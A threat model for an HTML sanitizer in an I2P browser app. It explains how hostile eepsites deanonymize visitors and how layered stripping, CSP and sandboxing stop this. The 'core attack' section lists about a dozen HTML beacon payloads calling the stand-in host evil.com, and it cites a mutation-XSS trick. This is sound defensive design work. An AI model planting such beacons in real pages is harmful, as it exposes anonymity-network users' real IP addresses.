# Sanitizer Threat Model

`scripts/html_sanitizer.py` is the safety membrane between hostile eepsite
content and the user's device. It is the single most security-critical
file in Echelon. This document is its threat model.

## The attacker

A malicious (or merely careless) eepsite operator who controls the HTML,
CSS, and headers their site returns. They want to **deanonymize the
visitor** — learn the visitor's real clearnet IP — or **run code** in the
visitor's app context.

They are not hypothetical. I2P hidden services are exactly where this
attacker lives, and it's a known, documented attack
([PurpleI2P/i2pd#1857](https://github.com/PurpleI2P/i2pd/issues/1857)):

> "Non-i2p requests can reveal a user's IP address... it makes it easy for
> site owners to identify the user, even unintentionally."

## The core attack: clearnet beacon

If the visitor's browser renders the eepsite's raw HTML, ANY reference to a
clearnet resource causes the browser to fetch it **directly over clearnet**,
leaking the IP:

```html
<img src="https://tracker.evil.com/pixel.png?visitor=123">  <!-- the classic -->
<link rel="stylesheet" href="https://evil.com/s.css">       <!-- CSS beacon -->
<link rel="preconnect" href="https://evil.com">             <!-- DNS leak -->
<div style="background:url(https://evil.com/bg.png)">       <!-- CSS url() -->
<style>@import "https://evil.com/x.css"</style>             <!-- @import -->
<iframe src="https://evil.com">                             <!-- framed beacon -->
<video src="https://evil.com/v.mp4">                        <!-- media beacon -->
<form action="https://evil.com">                            <!-- on submit -->
<img srcset="https://evil.com/2x.png 2x">                   <!-- srcset -->
<svg><use href="https://evil.com/s#i"></svg>                <!-- SVG use -->
<body background="https://evil.com/bg">                     <!-- legacy attr -->
<meta http-equiv="refresh" content="0;url=https://evil.com"> <!-- redirect -->
```

One of these on the page = visitor deanonymized.

## The defense: server-side sanitize, then sandbox + CSP

The daemon fetches the eepsite, sanitizes the HTML **before** the webview
sees it, and the webview only renders already-safe HTML. Defense in depth,
three independent layers:

### Layer 1 — strip / rewrite (the parser)

Every URL-bearing construct is policed:
- **In-network** resources (relative paths, `*.i2p` hosts) are **rewritten**
  to load back through the daemon's `/browse/resource` proxy — so they load
  IP-safely through i2pd.
- **Clearnet** resources are **removed** and counted.
- A **global URL-attribute sweep** polices `src`/`href`/`action`/`formaction`/
  `background`/`poster`/`data`/`cite`/`srcset`/etc. on **any** tag, not a
  per-tag allowlist (so a tag we didn't enumerate can't smuggle a load).
- All `<script>`, `<noscript>`, `<template>` removed with contents.
- All `on*` event handlers stripped.
- `<iframe>/<object>/<embed>/<audio>/<video>/<base>/<meta refresh>` dropped.
- CSS `url()` / `@import` sanitized in inline styles, `<style>` blocks, AND
  standalone stylesheet responses served through the resource proxy.
- `javascript:`/`vbscript:`/`data:`(non-image) schemes neutralized.

### Layer 2 — final scrub (belt for parser-differential bugs)

Mutation-XSS and malformed markup can confuse any HTML parser into emitting
something the structured pass missed (e.g. `<scr<script>ipt>`). A final
string pass neutralizes residual `<script` literals, `javascript:`/
`vbscript:` schemes, and bare clearnet `http(s)://host` tokens.

### Layer 3 — injected CSP + sandbox (defense in depth)

Even if a payload survives layers 1–2, the rendered document carries:
- An injected `<meta>` CSP **and** an HTTP CSP header:
  `default-src 'none'; script-src 'none'; connect-src 'none'; ...` — so it
  can't execute script or open any network connection.
- The render iframe uses `srcdoc` (opaque origin) **without**
  `allow-same-origin`, so it can't reach app state, and `allow-scripts` is
  gated by the per-site JS toggle (and scripts are stripped anyway).

## Non-goals

- The sanitizer does **not** try to preserve every site's exact look. If an
  eepsite genuinely depends on a clearnet font or a script, it renders
  degraded. Safety wins over fidelity, every time.
- It does **not** allowlist "good" clearnet hosts. There is no good clearnet
  host in the eepsite-render context — clearnet egress is the outproxy's job,
  explicit and separate.

## Test posture

HTML is treated as "a biohazard in angle brackets." Coverage:
- `test_html_sanitizer.py` — per-vector unit tests for every construct above.
- `test_sanitizer_validation.py` — ~80-payload adversarial corpus asserting
  two invariants on every input: **no clearnet origin survives** and **no
  script survives**, including malformed/encoded/parser-differential inputs.
- `test_i2p_live.py` — the invariants are re-asserted on REAL eepsite content
  fetched from the live I2P network.

The adversarial suite has already caught real gaps during development (legacy
`background` attr, `input[type=image]`, broken-nested script tags). When it
catches one, that's the system working — add the vector and fix the layer.
